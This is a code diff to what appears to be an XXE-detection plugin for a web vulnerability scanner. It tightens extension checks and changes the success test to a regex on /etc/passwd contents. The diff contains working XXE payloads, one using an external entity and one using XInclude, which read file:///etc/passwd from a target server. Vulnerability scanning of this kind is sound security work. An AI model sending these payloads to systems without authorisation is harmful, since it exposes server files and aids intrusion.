@@ -25,7 +25,7 @@ class POC():
 
     def verify(self):
 
-        if self.dictdata.get("url").get("extension") in notAcceptedExt:
+        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
             return
         params = self.dictdata.get("request").get("params").get("params_url") + \
                  self.dictdata.get("request").get("params").get("params_body")
@@ -46,15 +46,15 @@ class POC():
             payloads = [
                 (
                 '''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
-                "root:x:0"),
+                b"root:[x\*]:0:0:"),
                 (
                 '''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
-                "root:x:0")
+                b"root:[x\*]:0:0:")
             ]
             for payload, show in payloads:
                 req = self.parser.generaterequest({"data":payload})
                 r = request(**req)
-                if show in r.text:
+                if re.search(show, r.content):
                     self.save("in body ,payload:{}".format(payload))
 
             # bind-xxe
@@ -85,13 +85,13 @@ class POC():
                 success=False
                 #show-xxe
                 payloads=[
-                    ('''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',"root:x:0"),
-                    ('''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',"root:x:0")
+                    ('''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',b"root:[x\*]:0:0:"),
+                    ('''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',b"root:[x\*]:0:0:")
                 ]
                 for payload,show in payloads:
                     req=self.parser.getreqfromparam(param,"w",payload)
                     r=request(**req)
-                    if show in r.text:
+                    if re.search(show, r.content):
                         # success=True
                         self.save("param:{} ,payload:{}".format(param.get("name",""),payload))
                 if not success:
@@ -150,7 +150,7 @@ class POC():
         needtestparams=[]
         for param in params:
             name=param.get("name","")
-            if name is not "":
+            if name !=  "":
                 for arg in self.argnames:
                     if arg in name:
                         needtestparams.append(param)
